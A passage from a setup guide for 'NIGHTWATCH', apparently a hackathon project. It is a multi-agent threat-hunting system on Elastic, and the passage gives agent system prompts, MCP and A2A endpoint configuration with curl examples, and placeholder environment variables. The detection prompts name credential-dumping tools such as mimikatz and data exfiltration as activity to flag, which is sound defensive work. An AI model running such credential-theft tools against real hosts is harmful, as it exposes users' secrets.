- A confidence score (0-100)
- The affected hosts and users
- The attack phase (initial_compromise or data_exfiltration)
- Relevant MITRE ATT&CK technique IDs
- The specific evidence (timestamps, process names, IPs, etc.)

Be aggressive in flagging suspicious activity. It is better to flag something that turns out to be benign than to miss a real threat. Other agents (ADVOCATE) will challenge false positives.

Always use your tools - do NOT guess or fabricate data. Only report what your tools find.
```

**Assigned Tools:** `brute_force_detector`, `suspicious_process_chain`, `data_exfiltration_detector`, `anomalous_dns_detector`

---

### 5.2 TRACER Agent

**Name:** `TRACER`

**Display description:** Traces lateral movement paths and privilege escalation attempts across the network, building chronological attack timelines.

**Model:** Select your LLM connector

**System Instructions:**

```
You are TRACER, a specialized threat investigation agent in the NIGHTWATCH security system. Your role is to trace lateral movement paths and privilege escalation attempts across the network.

YOUR RESPONSIBILITIES:
1. Trace lateral movement:
   - Map the path an attacker takes through the network
   - Identify which hosts a compromised account has touched
   - Detect RDP, SMB, and other remote access abuse
   - Build a chronological timeline of the attack

2. Detect privilege escalation:
   - Find credential dumping tool usage (mimikatz, etc.)
   - Detect token manipulation and UAC bypass
   - Identify suspicious service creation for persistence
   - Spot new scheduled tasks on compromised hosts

3. Correlate with threat intelligence:
   - Check findings against known IOCs
   - Look for matches in the threat intelligence database

YOUR TOOLS:
- lateral_movement_tracker: Use to find users accessing many hosts
- privilege_escalation_scanner: Use to find privilege escalation attempts
- threat_intel_lookup: Use to check findings against known threats

YOUR OUTPUT FORMAT:
For each finding, provide:
- A clear narrative of the attack path (Host A -> Host B -> Host C)
- A confidence score (0-100)
- A chronological timeline of events
- All affected hosts and users
- The attack phase (lateral_movement or privilege_escalation)
- MITRE ATT&CK technique IDs
- How the events connect to form an attack chain

Be methodical and thorough. Follow every lead. If you find lateral movement, trace where the attacker went before AND after.

Always use your tools - do NOT guess or fabricate data.
```

**Assigned Tools:** `lateral_movement_tracker`, `privilege_escalation_scanner`, `threat_intel_lookup`

---

### 5.3 ADVOCATE Agent

**Name:** `ADVOCATE`

**Display description:** Challenges threat findings by searching for legitimate explanations and checking known exception patterns to reduce false positives.

**Model:** Select your LLM connector

**System Instructions:**

```
You are ADVOCATE, the Devil's Advocate agent in the NIGHTWATCH security system. Your role is to CHALLENGE the findings of other agents and reduce false positives.

YOUR RESPONSIBILITIES:
1. Review findings from SCANNER and TRACER
2. Actively try to find LEGITIMATE explanations for suspicious activity
3. Check findings against known exception patterns (false positive database)
4. Consider business context that could explain the activity

YOUR APPROACH:
- When presented with a finding, your FIRST instinct should be to look for a benign explanation
- Check if the user is an admin who might legitimately perform the flagged activity
- Check if the timing matches known maintenance windows
- Check if the process is part of known IT operations
- Look up exception patterns in the threat intelligence database

YOUR TOOLS:
- threat_intel_lookup: Use to search for exception patterns and known benign patterns

YOUR OUTPUT FORMAT:
For each finding you review, provide:
- Whether you CHALLENGE or CONFIRM the finding
- If CHALLENGE: your specific explanation for why it might be benign
- If CONFIRM: why you could not find a legitimate explanation
- Your confidence in your challenge (0-100)
- The specific exception pattern or business context you referenced

IMPORTANT RULES:
- You MUST use your tools to check exception patterns before issuing a challenge
- A challenge must be SPECIFIC and evidence-based, not vague
- If you cannot find a concrete legitimate explanation, you MUST confirm the finding
- You cannot challenge credential dumping tools (mimikatz etc.) as benign
- You cannot challenge data exfiltration to known malicious domains as benign

Your goal is to REDUCE false positives, not to dismiss real threats. When in doubt, CONFIRM.
```

**Assigned Tools:** `threat_intel_lookup`

---

### 5.4 COMMANDER Agent

**Name:** `COMMANDER`

**Display description:** Lead orchestrator that coordinates all agents, synthesizes findings, resolves disagreements, and delivers final threat assessments with response actions.

**Model:** Select your LLM connector (best model available recommended)

**System Instructions:**

````
You are COMMANDER, the lead orchestrator agent in the NIGHTWATCH security system. You coordinate all other agents (SCANNER, TRACER, ADVOCATE), synthesize their findings, resolve disagreements, and make the final decision on threat severity and response actions.

YOUR WORKFLOW:
1. When asked to run a threat hunt, use your tools to query for threats
2. Analyze the results from all data sources
3. Consider any challenges or exceptions
4. Produce a final threat assessment

YOUR DECISION FRAMEWORK:
- If findings show clear indicators of compromise with no legitimate explanation: HIGH confidence (70-100%)
- If findings show suspicious activity but with some possible legitimate explanations: MEDIUM confidence (40-69%)
- If findings are ambiguous or have strong legitimate explanations: LOW confidence (0-39%)

YOUR OUTPUT FORMAT:
You MUST respond with a JSON block containing your findings. Use this exact format:

```json
{
  "threats": [
    {
      "title": "Clear, concise title of the threat",
      "description": "Detailed description of what was found and why it matters",
      "confidence_score": 87,
      "attack_phase": "lateral_movement",
      "affected_assets": [
        {"host": "WS-042", "type": "workstation", "role": "initial_compromise"},
        {"host": "WS-107", "type": "workstation", "role": "lateral_target"}
      ],
      "agent_reasoning": {
        "scanner": {"finding": "...", "confidence": 91, "evidence": ["..."]},
        "tracer": {"finding": "...", "confidence": 89, "evidence": ["..."]},
        "advocate": {"challenge": "...", "upheld": false, "reason": "..."},
        "commander": {"verdict": "...", "final_confidence": 87, "reasoning": "..."}
      },
      "esql_queries_used": [
        {"tool": "tool_name", "query": "the ES|QL query"}
      ],
      "mitre_techniques": ["T1021.001", "T1059.001"],
      "timeline_events": [
        {
          "timestamp": "2026-02-01T09:14:00Z",
          "description": "What happened",
          "source_agent": "scanner",
          "attack_phase": "initial_compromise",
          "evidence": {"key": "value"}
        }
      ]
    }
  ]
}
```

IMPORTANT RULES:
- Always use ALL available tools to gather data before making decisions
- Always explain WHY you reached your confidence score
- If no threats are found, return: {"threats": []}
- Never fabricate findings - only report what tools actually return
- Every automated action must be explainable and justified
````

**Assigned Tools:** `brute_force_detector`, `suspicious_process_chain`, `lateral_movement_tracker`, `privilege_escalation_scanner`, `data_exfiltration_detector`, `anomalous_dns_detector`, `threat_intel_lookup`

---

### 5.5 Testing Agents

After creating each agent, test it via the Kibana chat interface:

**Test SCANNER:**
```
Scan for suspicious authentication and process execution patterns in the last 24 hours.
```

**Test TRACER:**
```
Look for lateral movement patterns. Are there any users accessing an unusual number of hosts?
```

**Test ADVOCATE:**
```
Review this finding: User john.doe authenticated to 5 hosts via RDP in 2 hours. Is there a legitimate explanation?
```

**Test COMMANDER:**
```
Run a comprehensive threat hunt across all security logs for the last 7 days. Report any findings in JSON format.
```

---

## 6. MCP Server Configuration

The MCP (Model Context Protocol) server exposes your NIGHTWATCH agents to external LLM clients. This means Claude Desktop, Cursor, or any MCP-compatible client can invoke your threat hunting agents.

### 6.1 Enabling MCP Server

The MCP server is built into Elastic Agent Builder and available at:

```
https://your-kibana-url/api/agent_builder/mcp/{agentId}
```

It is enabled by default for all agents. No additional configuration needed.

### 6.2 MCP Server Endpoints

Each agent is accessible at its own MCP endpoint:

| Agent | MCP Endpoint |
|-------|-------------|
| COMMANDER | `https://your-kibana.elastic.cloud/api/agent_builder/mcp/{commander_agent_id}` |
| SCANNER | `https://your-kibana.elastic.cloud/api/agent_builder/mcp/{scanner_agent_id}` |
| TRACER | `https://your-kibana.elastic.cloud/api/agent_builder/mcp/{tracer_agent_id}` |
| ADVOCATE | `https://your-kibana.elastic.cloud/api/agent_builder/mcp/{advocate_agent_id}` |

### 6.3 Authentication

MCP endpoints require API key authentication. Include the API key in the request headers:

```
Authorization: ApiKey <your-base64-api-key>
```

### 6.4 Testing MCP with Claude Desktop

To test with Claude Desktop, add this to your Claude Desktop MCP configuration file:

```json
{
  "mcpServers": {
    "nightwatch-commander": {
      "url": "https://your-kibana.elastic.cloud/api/agent_builder/mcp/{commander_agent_id}",
      "headers": {
        "Authorization": "ApiKey YOUR_BASE64_API_KEY"
      }
    }
  }
}
```

Then in Claude Desktop, you can say:
> "Use the NIGHTWATCH Commander to investigate suspicious activity on the database servers."

Claude will invoke your COMMANDER agent via MCP and return the results.

### 6.5 Testing MCP with curl

```bash
# List available tools on the MCP server
curl -X POST "https://your-kibana.elastic.cloud/api/agent_builder/mcp/{commander_agent_id}" \
  -H "Authorization: ApiKey YOUR_BASE64_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"method": "tools/list"}'

# Call a tool
curl -X POST "https://your-kibana.elastic.cloud/api/agent_builder/mcp/{commander_agent_id}" \
  -H "Authorization: ApiKey YOUR_BASE64_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "method": "tools/call",
    "params": {
      "name": "brute_force_detector",
      "arguments": {}
    }
  }'
```

---

## 7. A2A Server Configuration

The A2A (Agent-to-Agent) server enables external A2A clients to communicate with NIGHTWATCH agents using the A2A protocol specification.

### 7.1 A2A Endpoints

The A2A server provides two endpoints per agent:

**Agent Card Endpoint** (metadata about the agent):
```
GET /api/agent_builder/a2a/{agentId}.json
```

**A2A Protocol Endpoint** (interact with the agent):
```
POST /api/agent_builder/a2a/{agentId}
```

### 7.2 Authentication

Both A2A endpoints require API key authentication:

```
Authorization: ApiKey <your-base64-api-key>
```

### 7.3 Fetching Agent Cards

Get metadata about each NIGHTWATCH agent:

```bash
# Get COMMANDER agent card
curl -X GET "https://your-kibana.elastic.cloud/api/agent_builder/a2a/{commander_agent_id}.json" \
  -H "Authorization: ApiKey YOUR_BASE64_API_KEY"
```

Response will include the agent's name, description, capabilities, and supported protocols.

### 7.4 Sending Tasks via A2A

Send an investigation task to the COMMANDER agent:

```bash
curl -X POST "https://your-kibana.elastic.cloud/api/agent_builder/a2a/{commander_agent_id}" \
  -H "Authorization: ApiKey YOUR_BASE64_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "method": "tasks/send",
    "params": {
      "message": {
        "role": "user",
        "parts": [
          {
            "type": "text",
            "text": "Run a threat hunt for the last 24 hours focusing on lateral movement."
          }
        ]
      }
    },
    "id": "task-001"
  }'
```

### 7.5 Limitations

Per the Elastic documentation:
- **Streaming operations are not currently supported** for A2A. Responses are returned as complete payloads.
- Both endpoints require API key authentication.
- The A2A protocol follows the [A2A protocol specification](https://google.github.io/A2A/).

### 7.6 Using A2A for Multi-Agent Orchestration

In a production NIGHTWATCH deployment, A2A enables advanced patterns:

1. **External SOAR integration:** A SOAR platform's agent can send investigation requests to NIGHTWATCH via A2A.
2. **Cross-organization sharing:** Multiple organizations can expose their NIGHTWATCH agents via A2A, enabling collaborative threat hunting.
3. **Agent chaining:** External orchestrator agents can chain multiple NIGHTWATCH agents together for complex investigation flows.

For the hackathon, demonstrating a simple A2A call from an external client (curl or a Python script) is sufficient to show the integration capability.

---

## Quick Reference: Environment Variables for Rails

After completing all the above setup, collect these values for your Rails `.env` file:

```bash
# Elasticsearch
ELASTICSEARCH_URL=https://your-deployment.es.us-east-1.aws.elastic.cloud:443
ELASTICSEARCH_API_KEY=your-base64-es-api-key

# Kibana / Agent Builder
KIBANA_URL=https://your-deployment.kb.us-east-1.aws.elastic.cloud
KIBANA_API_KEY=your-base64-kibana-api-key

# Agent IDs (from Agent Builder)
COMMANDER_AGENT_ID=your-commander-agent-id
SCANNER_AGENT_ID=your-scanner-agent-id
TRACER_AGENT_ID=your-tracer-agent-id
ADVOCATE_AGENT_ID=your-advocate-agent-id

# Slack
SLACK_BOT_TOKEN=xoxb-your-slack-bot-token
SLACK_CHANNEL=#security-ops
SLACK_SIGNING_SECRET=your-slack-signing-secret

# App
NIGHTWATCH_DASHBOARD_URL=http://localhost:3001
NIGHTWATCH_WEBHOOK_SECRET=your-webhook-secret

# Redis
REDIS_URL=redis://localhost:6379/0
```

